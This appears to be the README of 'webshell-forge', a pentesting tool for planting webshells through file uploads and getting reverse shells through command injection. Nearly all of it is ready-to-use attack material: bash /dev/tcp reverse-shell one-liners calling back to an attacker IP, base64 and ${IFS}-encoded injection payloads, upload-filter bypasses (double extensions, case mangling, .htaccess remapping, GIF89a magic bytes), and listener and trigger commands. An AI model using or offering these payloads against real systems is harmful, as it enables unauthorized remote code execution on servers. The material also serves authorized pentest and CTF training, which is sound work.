# webshell-forge · v1.2.0

Stack-aware webshell forge for authorized web-app pentesting. It does three jobs:

1. **Forge** — stamp a shell into every executable extension for a stack, with
   upload-filter bypass variants, and write an `ffuf` wordlist so you can find
   *which* extension the server actually runs.
2. **Reverse** — generate a ready-to-fire PHP reverse shell (`shellx`) with your
   LHOST/LPORT baked in.
3. **Encode** — turn a reverse shell into an injection-safe base64 blob for OS
   command injection through hostile boundaries (filename → shell → Burp).

> **Authorized testing only.** Labs, CTFs, and engagements with signed scope.

---

## TL;DR — just run it

```bash
python3 webshell_forge.py
```

No arguments = a menu. Pick a number, take the defaults, go. Everything below is
the detail for when you want it.

```
  1) PHP upload    — shells + bypasses + ffuf wordlist   (most common)
  2) IIS upload    — .aspx/.ashx shells + bypasses
  3) Reverse shell — PHP connect-back (shellx)
  4) Encoder       — base64 revshell for command injection
  5) Custom        — every option, step by step
```

---

## Install (optional — runs fine in place)

```bash
mkdir -p ~/.local/bin
cp webshell_forge.py ~/.local/bin/webshell-forge
chmod +x ~/.local/bin/webshell-forge
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc && source ~/.zshrc
webshell-forge
```

Python 3.6+, **stdlib only** — no pip, nothing to install on a bare exam box.
`ip` is used to auto-detect your VPN IP; if it's missing, pass `--lhost`.

---

## The three workflows

### Workflow A — "There's a file upload. Get me RCE."

This is the 90% case. You upload a shell, but the app filters extensions and/or
content, so you don't know what will land *and execute*. The tool stamps your
shell into every PHP extension plus bypass variants, and gives you a wordlist to
find the winner.

**Menu:** pick `1`.
**CLI:**

```bash
webshell-forge -s php -b -m -w -u http://$ip/uploads
```

What each flag does here:

| flag | does | why you want it on an upload |
|------|------|------------------------------|
| `-s php` | PHP stack | picks the extension set to try |
| `-b` | bypass variants | double-ext, case, trailing-dot — beats naive blocklists |
| `-m` | magic bytes | prepends `GIF89a;` to pass image/MIME sniffing |
| `-w` | wordlist | writes `shells.txt` to fuzz which extension ran |
| `-u URL` | ffuf line | prints the exact command to test execution |

Then follow the **NEXT STEPS** box it prints:

```
1. upload every file in ./shells/  (app form / Burp Intruder / curl loop)
2. ffuf -u http://$ip/uploads/FUZZ -w ./shells/shells.txt -mc 200 -fs 0
   → a NON-ZERO size on a .phtml/.phar = it EXECUTED = your RCE path
3. curl 'http://$ip/uploads/shell.phtml?c=id'
```

The key idea: **uploading is not the same as executing.** Step 2 is the whole
point — it tells you which of the ~29 files the server actually runs as code.

---

### Workflow B — "I want a reverse shell file."

A ready PHP connect-back (the `shellx` universal shell: Linux+Windows, OS-detect,
relay loop), with your LHOST/LPORT **baked into the file** so a bare trigger
connects back to *you*, not a placeholder.

**Menu:** pick `3`, enter LHOST/LPORT (it shows your detected `tun0`).
**CLI:**

```bash
webshell-forge -s php -t reverse --lhost 10.10.14.5 --lport 443 -b -m -w
```

Then, from the NEXT STEPS box:

```bash
rlwrap -cAr nc -lvnp 443              # ← listener FIRST
curl 'http://TARGET/shell.php'        # LHOST:port already baked in
# override on the fly if needed:
curl 'http://TARGET/shell.php?ip=<LHOST>&port=<LPORT>'
```

> **Gotcha this fixes:** if you don't bake in the LHOST, the shell falls back to
> a default IP and connects nowhere. The forge stamps your real IP so you can't
> hit that. Always start the listener before you trigger.

---

### Workflow C — "There's command injection. I need a reverse shell through it."

You found OS command injection (in a filename, a parameter, a header) and you're
pushing it through Burp. Raw reverse shells break here — spaces, quotes, `>`,
`&`, and Burp's own URL-encoding mangle them. base64 wraps the payload into one
clean blob with no shell metacharacters, decoded and run on the target.

**Menu:** pick `4`.
**CLI:**

```bash
webshell-forge -e --lhost 10.10.14.5 --lport 443
webshell-forge -e --lhost 10.10.14.5 --lport 443 --shell mkfifo   # other flavour
```

It prints five forms:

```
[1] raw          bash -i >& /dev/tcp/10.10.14.5/443 0>&1     (target shell only)
[2] base64       YmFzaCAtaSA+Ji...
[3] inject-ready ;echo <b64>|base64 -d|bash;                 (drop into the injection point)
[4] ${IFS}       ;echo${IFS}<b64>|base64${IFS}-d|bash;       (when SPACES are filtered)
[5] URL-encoded  %3Becho%20...                               (for Burp — encode ONCE)
```

Flavours (`--shell`): `bash` (default), `sh`, `nc`, `mkfifo`.

**The two rules the tool reminds you of, because they cost real time:**

- **Encoding layers.** If the boundary decodes *once* (server only), send form
  `[3]`. If it *double*-decodes (Burp URL-encodes AND the server decodes), send
  `[3]` **raw** and don't pre-encode — double-encoding is how a `.` becomes the
  literal text `%2e` and your file lands with no real extension.
- **Reverse shells run WHERE they execute.** Never pipe these to `bash` on Kali
  — that just shells your own box (you'll see `connect to [YOU] from [YOU]`).
  The payload only reverse-connects when the *target* runs it.

---

## The upload-bypass toolkit (what `-b`, `-m`, `.htaccess` actually do)

**`-b` bypass variants**, generated per stack:

- **Double extension, both directions** — `shell.jpg.php` (last ext wins on most
  configs) and `shell.php.jpg` (`AddHandler`/`mod_mime` misconfig runs the first
  match).
- **Case-mangling** — `shell.PHP`, `shell.Php`, `shell.phP` (case-insensitive
  blocklist vs case-sensitive handler).
- **Trailing dot** — `shell.php.` (stripped on save, missed by the blocklist).
- **`.htaccess` helper (PHP)** — maps a junk extension to the PHP handler. Upload
  it alongside your shells, then any `shell.<junk>` runs as PHP.

**`-m` magic bytes** — prepends `GIF89a;`. PHP ignores the leading bytes and
still parses `<?php`. Defeats content-sniffing filters that check for an image
header. Some engines choke on the prefix — test before relying on it.

**When `.php` is blocked**, the winners are usually `.phtml`, `.phar`, or
`.php5` — the handler runs them but naive blocklists forget them. That's exactly
what the wordlist + ffuf step finds for you.

---

## Stacks & extensions

| Stack  | Extensions written                                        | Native reverse |
|--------|-----------------------------------------------------------|:--------------:|
| `php`  | php, php3, php4, php5, php7, phtml, phar, pht, phps, shtml | yes (shellx)   |
| `asp`  | asp, asa, cer, cdx                                         | via PS helper  |
| `aspx` | aspx, ashx, asmx, asax, ascx                              | via PS helper  |
| `jsp`  | jsp, jspx, jspf, jsw, jsv, war                            | yes            |
| `cfm`  | cfm, cfml, cfc                                             | via PS helper  |
| `cgi`  | cgi, pl, pm                                               | yes            |

For Windows stacks (`asp`/`aspx`/`cfm`) there's no reliable native reverse
one-liner, so `-t reverse` gives you a **cmd shell + a PowerShell reverse
one-liner** to run through `?c=`, rather than a broken payload.

---

## All flags

| Flag | Description |
|------|-------------|
| *(no args)* / `-i` | interactive menu (start here) |
| `-s, --stack` | `php` `asp` `aspx` `jsp` `cfm` `cgi` `all` (default: `php`) |
| `-t, --type` | `cmd` (default) or `reverse` |
| `-p, --payload FILE` | clone YOUR own payload instead of a generated one |
| `--lhost IP` | reverse callback IP (default: auto-detect `tun0`) |
| `--lport N` | reverse callback port (default: `443`) |
| `-b, --bypass` | add double-ext / case / trailing bypasses |
| `-m, --magic` | prepend `GIF89a` magic bytes |
| `-w, --wordlist` | write `shells.txt` for ffuf |
| `-u, --url URL` | print a ready ffuf line against `URL/FUZZ` |
| `-e, --encode` | reverse-shell encoder for command injection |
| `--shell` | encoder flavour: `bash` `sh` `nc` `mkfifo` (default: `bash`) |
| `-n, --name STEM` | base filename stem (default: `shell`) |
| `-o, --out DIR` | output dir (default: `./shells`) |
| `--clean` | wipe the output dir before writing |

---

## Copy-paste recipes

```bash
# interactive (recommended under time pressure)
webshell-forge

# PHP upload attack — the everything pass
webshell-forge -s php -b -m -w -u http://$ip/uploads

# IIS upload attack
webshell-forge -s aspx -b -m -w -u http://$ip/uploads

# PHP reverse shell, LHOST baked in
webshell-forge -s php -t reverse --lhost 10.10.14.5 --lport 443 -b -w

# every stack at once (kitchen sink)
webshell-forge -s all -b -m -w -u http://$ip/uploads

# clone your own tuned payload across all php exts
webshell-forge -p myshell.php -s php -b

# command-injection encoder
webshell-forge -e --lhost 10.10.14.5 --lport 443

# find which extension executed (after uploading ./shells/)
ffuf -u http://$ip/uploads/FUZZ -w shells/shells.txt -mc 200 -fs 0
```

**Habit:** run it from the box's working dir so output lands with that
engagement's files:

```bash
cd ~/boxes/vanity
webshell-forge -s php -t reverse --lport 443 -b -w -u http://$ip/uploads
# → ./shells/ right here
```

---

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| Uploaded file returns its **source code** as text | Server served it static — the stored name has no real executable extension | Check the real stored name (`curl $ip/uploads/`); re-upload with a clean single-dot `.phtml` |
| Filename on disk contains literal `%2e` / `%252e` | **Double-encoded** the dot — bypass over-fired | Stop double-encoding; use a real dot, let ONE decode layer happen |
| Reverse shell "connects" but it's `[YOU] from [YOU]` | Ran the payload on Kali, not the target | Trigger it through the target's code, not `| bash` on your box |
| Triggered shell connects nowhere | LHOST not set / wrong | Use `--lhost` (baked in), or `?ip=&port=` override; confirm `ip a show tun0` |
| ffuf shows a file but `?c=id` returns nothing | It uploaded but didn't execute | Different extension — check the non-zero-size hits from the ffuf step |
| `GIF89a` prefix breaks the shell | Engine choked on the magic bytes | Drop `-m` for that stack; not all handlers tolerate it |

---

## Notes & caveats

- Generated shells are minimal **proof-of-execution stubs** — perfect for finding
  which extension runs. For a durable foothold on a real target, forge with your
  own tuned payload via `-p`.
- The php/jsp reverse templates assume a **Linux** target (`/bin/bash`,
  `/dev/tcp`). On a Windows PHP box, use `-t cmd` plus the printed PowerShell
  one-liner.
- Repeat runs write into the same `-o` dir; use `--clean` so payloads from
  different targets don't mix.
- Clean up your uploads afterward — a `/uploads/` full of `shell.*` variants is
  litter you're expected to remove on a real engagement.

## Disclaimer

For legal, authorized security testing and education only. You are responsible
for having permission to test any target. No liability for misuse.
